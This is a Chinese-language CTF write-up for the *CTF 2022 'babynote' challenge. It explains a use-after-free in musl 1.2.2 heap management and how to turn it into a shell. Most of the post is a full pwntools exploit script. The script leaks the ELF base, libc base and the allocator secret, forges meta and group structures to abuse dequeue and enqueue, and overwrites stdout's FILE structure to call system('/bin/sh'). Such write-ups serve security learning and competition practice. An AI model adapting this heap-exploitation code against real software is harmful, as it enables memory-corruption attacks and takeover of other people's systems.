---
layout: post
title: "2022 starctf babynote wp"
date:   2022-5-11
tags: [ctf_wp]
comments: true
author: wsxk
---

这道题也是musl的题目，其实算是 defcon 2021 qual mooosl的缩减版

（首先是没有爆破，其次是利用条件多，毕竟可以无限次forget

是很纯的musl1.2.2利用题目

但是我看exp发现，其实只要泄露2次就能把所有的信息都泄露光了。不用像上一回那样泄露个5-6次，十分的方便（之所以能2次泄露，是利用了musl的静态堆内存的特点，即musl会取 可执行程序（elf）和libc区段的空闲区域 用作堆chunk，我们可以根据这个得到elf基址和libc基址。mmap地址和libc基址关系很明显。ctx更不用多说。

FSOP也是常规操作

这么一看，musl的可利用点好像也不是特别多。

### 1.漏洞定位

先看一下主程序（经过修改）

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-11-starctf2022_babynote/1.png)

漏洞点主要是存在于delete函数那

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-11-starctf2022_babynote/2.png)

head链就是存放申请的chunk的单向链表（插入链头）

看这段代码大家可以看到，如果删除的chunk是链表的最后一个，是不会把 被删除chunk的前一个chunk 的指向被删除chunk的指针 清零的

这就相当于一个uaf漏洞

### 2.漏洞利用

但是想利用这个漏洞，需要有前提。就是这个chunk管理的note必须
和chunk位于同一个group并且必须在chunk的前方（这样申请才能先申请到note，不然先申请到chunk就没有意义了）


然后因为musl的静态堆内存的特性

有些堆是在程序段附近的，有些堆是在libc段附近的，这样我们就可以直接得到elf基址和libc基址。这就方便很多了。

### 3.漏洞实施前提

musl一般要进行漏洞实施一定要知道secret是什么

secret地址我们可以通过ctx（libc+一定的值，可以在libc.so malloc里发现ctx.seq然后减0x390即可）

然后重复上面的利用方式，这一回就不用那么复杂，直接写chunk的note地址为ctx地址即可

### 4.getshell

一般是通过mmap一个大的内存（来达到地址空间对齐）

基本步骤如下：

1. 申请一个0x1200大小的note（mmap）

2. 再申请一个0x1200大小的note（这时候可以保证这个note能写入的地址段中一定有0x1000对齐的

3. 往里面写东西，伪造meta 和 group ，然后meta->pre=stdout-0x18,meta->next=fake_mem_addr ,然后写入，最后往被控制的chunk里写入这个note里写入你伪造的chunk的地址，然后free掉，就能利用dequeue机制在stout-0x10处写入fake_mem_addr（过掉检查）

4. 在构造一个0x1200大小的note（mmap），这时候是为了将这个chunk入队（queue）。

5.  这时候其实我们可以控制 0x1200的note，相当于任意地址写，我们在stdout-0x10处申请了一个chunk，写入shell信息，就能完成getshell 

## exp

    from pwn import *

    io = process('./babynote')	
    #libc = ELF('./libc.so')
    libc = ELF('/usr/local/musl/lib/libc.so')
    #io = process(["./libc.so",'./babynote'])
    #libc = ELF('./libc.so')

    context.log_level='debug'
    def add(name,name_size,note,note_size):
        io.sendlineafter("option: ",str(1))
        io.sendlineafter("name size: ",str(name_size))
        io.sendafter("name: ",name)
        io.sendlineafter("note size: ",str(note_size))
        io.sendafter("note content: ",note)

    def find(name,name_size):
        io.sendlineafter("option: ",str(2))
        io.sendlineafter("name size: ",str(name_size))
        io.sendafter("name: ",name)

    def delete(name,name_size):
        io.sendlineafter("option: ",str(3))
        io.sendlineafter("name size: ",str(name_size))
        io.sendafter("name: ",name) 

    def forget():
        io.sendlineafter("option: ",str(4))

    ## 0x28 has 10 chunks
    ## leak info
    add(b'vulnerabl',len(b'vulnerabl'),b'vulnerabl',len(b'vulnerabl'))
    forget()
    for i in range(8):
        find(b'2'*0x28,0x28)
    add(b'vulnerabl',len('vulnerabl'),b'0'*0x28,0x28) 
    add(b'control',len('control'),b'1'*0x28,0x28)
    for i in range(5):
        find(b'2'*0x28,0x28)
    delete(b'vulnerabl',len('vulnerabl'))
    add(b'aaaa',len(b'aaaa'),b'c'*0x38,0x38)
    find(b'vulnerabl',len('vulnerabl'))
    io.recvuntil(":")
    leak_elf = io.recv(16)
    elf_base = int(leak_elf[14:16]+leak_elf[12:14]+leak_elf[10:12]+leak_elf[8:10]+leak_elf[6:8]+leak_elf[4:6]+leak_elf[2:4]+leak_elf[0:2],16)-0x4c90
    #print("leak_elf:"+hex(int(leak_elf[14:16]+leak_elf[12:14]+leak_elf[10:12]+leak_elf[8:10]+leak_elf[6:8]+leak_elf[4:6]+leak_elf[2:4]+leak_elf[0:2],16)))
    leak_libc = io.recv(16)
    libc.address = int(leak_libc[14:16]+leak_libc[12:14]+leak_libc[10:12]+leak_libc[8:10]+leak_libc[6:8]+leak_libc[4:6]+leak_libc[2:4]+leak_libc[0:2],16)-0xb3fb0
    #print("leak_libc:"+hex(int(leak_libc[14:16]+leak_libc[12:14]+leak_libc[10:12]+leak_libc[8:10]+leak_libc[6:8]+leak_libc[4:6]+leak_libc[2:4]+leak_libc[0:2],16)))
    mmap_base = libc.address-0x4000
    ctx = libc.address + 0xb0aa0 ## how to find malloc_context ? use libc.so->malloc and find ctx.seq ctx = ctx.seq-0x390
    fake_meta_addr = mmap_base + 0x2010
    fake_mem_addr = mmap_base + 0x2040
    system = libc.sym['system']
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    stout = libc.address+0xB02E0

    print("elf_base:"+hex(elf_base))
    print("libc_base:"+hex(libc.address))
    print("mmap_base:"+hex(mmap_base)) 

    for i in range(5):
        find(b'3'*0x28,0x28)

    payload = p64(elf_base+0x4c40)+p64(ctx)+p64(len(b'vulnerabl'))+p64(0x28)+p64(0)
    find(payload,0x28)
    find(b'vulnerabl',len('vulnerabl'))
    io.recvuntil(":")
    secret=io.recv(16)
    secret=int(secret[14:16]+secret[12:14]+secret[10:12]+secret[8:10]+secret[6:8]+secret[4:6]+secret[2:4]+secret[0:2],16)
    print("secret:"+hex(secret))
    #gdb.attach(io)
    add(b'big_map',len(b'big_map'),b'a'*0x1200,0x1200)

    ## dequeue
    ## fake meta
    last_idx, freeable, sc, maplen = 0, 1, 8, 1
    #fake meta
    fake_meta = p64(stout - 0x18)                  # prev
    fake_meta += p64(fake_meta_addr + 0x30)         # next
    fake_meta += p64(fake_mem_addr)                 # mem
    fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx) 
    fake_meta += p64(0)
    #fake group
    fake_mem = p64(fake_meta_addr)                  # meta 
    fake_mem += p32(1) + p32(0)                     
    #前一个p32为active idx(实际只有5bit)+pad  
    #后一个p32为第一个chunk的idx，此处由于应为第一个chunk，
    #所以实际应为p32(0x8000)，参见上图，不过用p32(0)结果是一样的
    payload = b'a' * 0xaa0
    #fake meta area
    payload += p64(secret) + p64(0)
    payload += fake_meta + fake_mem + b'\n'
    '''
    实际内存布局：
    0x1200 chunk 头：a*0xaa0
    0x xxx000 fake meta area 
    0x xxx010 fake meta
    0x xxx040 fake group
    '''
    find(payload,0x1200)
    #通过把fake meta、fake group、fake meta_area布置在一个页（0x1000内）来确保对齐

    for i in range(3):
        find(b'4'*0x28,0x28)
    payload = p64(elf_base + 0x4c40) + p64(fake_mem_addr + 0x10) + p64(len(b'vulnerabl')) + p64(0x28) + p64(0)
    add('e'*0x58,0x58,payload,0x28)#覆盖UAF指针指向的manage chunk
    delete(b'vulnerabl',len('vulnerabl'))#释放UAF链表块，包括了释放fake_mem_addr + 0x10
    '''这一次释放是为了在stdout-0x18的地方写入fake_meta_addr + 0x30，
    目的是为了通过最后一次申请时get meta的校验'''
    #gdb.attach(io)
    
    ## enqueue
    last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta
    fake_meta = p64(0)                              # prev
    fake_meta += p64(0)                             # next
    fake_meta += p64(fake_mem_addr)                 # mem
    fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += p64(0)
    fake_mem = p64(fake_meta_addr)                  # meta
    fake_mem += p32(1) + p32(0)
    payload = b'a' * 0xa90
    payload += p64(secret) + p64(0)
    payload += fake_meta + fake_mem + b'\n'
    find(payload,0x1200)


    for i in range(2):
        find(b'4'*0x28,0x28)
    payload = p64(elf_base + 0x4c50) + p64(fake_mem_addr + 0x10) + p64(len(b'vulnerabl')) + p64(0x28) + p64(0)
    add(b'e'*0x58,0x58,payload,0x28)
    delete(b'vulnerabl',len('vulnerabl'))
    #gdb.attach(io)
    '''这次释放的目的是为了将fake meta(在0x1200堆块处)释放到active数组中
    注意以上两次释放通过控制last idx实现了对释放过程中nontrivial_free的执行流控制
    也就是dequeue和queue'''


    last_idx, freeable, sc, maplen = 1, 0, 8, 0
    fake_meta = p64(fake_meta_addr)                 # prev
    fake_meta += p64(fake_meta_addr)                # next
    fake_meta += p64(stout - 0x10)                 # mem
    fake_meta += p32(1) + p32(0)                    # avail_mask, freed_mask
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta += b'a' * 0x18
    fake_meta += p64(stout - 0x10)
    payload = b'a' * 0xa80
    payload += p64(secret) + p64(0)
    payload += fake_meta + b'\n'
    find(payload,0x1200)
    '''直接覆盖fake meta，将mem改成io FILE指针,此时不需要释放所以不用管group'''

    io.sendlineafter('option: ', '1')
    io.sendlineafter('name size: ', str(0x28))
    io.sendafter('name: ', '\n')
    io.sendlineafter('note size: ', str(0x80))#sc为8

    #gdb.attach(io)
    fake_IO  = b'/bin/sh\x00'                       # flags
    fake_IO += p64(0)                               # rpos
    fake_IO += p64(0)                               # rend
    fake_IO += p64(3)             # close
    fake_IO += p64(1)                               # wend
    fake_IO += p64(1)                               # wpos
    fake_IO += p64(0)                               # mustbezero_1
    fake_IO += p64(0)                               # wbase
    fake_IO += p64(0)                               # read
    fake_IO += p64(libc.sym['system'])  # write
    ## stdin->wpos != stdin->wbase
    io.sendline(fake_IO)
    #gdb.attach(io)
    io.interactive()


## 参考

[https://blog.csdn.net/weixin_45209963/article/details/124423573](https://blog.csdn.net/weixin_45209963/article/details/124423573)

[https://eqqie.cn/index.php/archives/1931](https://eqqie.cn/index.php/archives/1931)

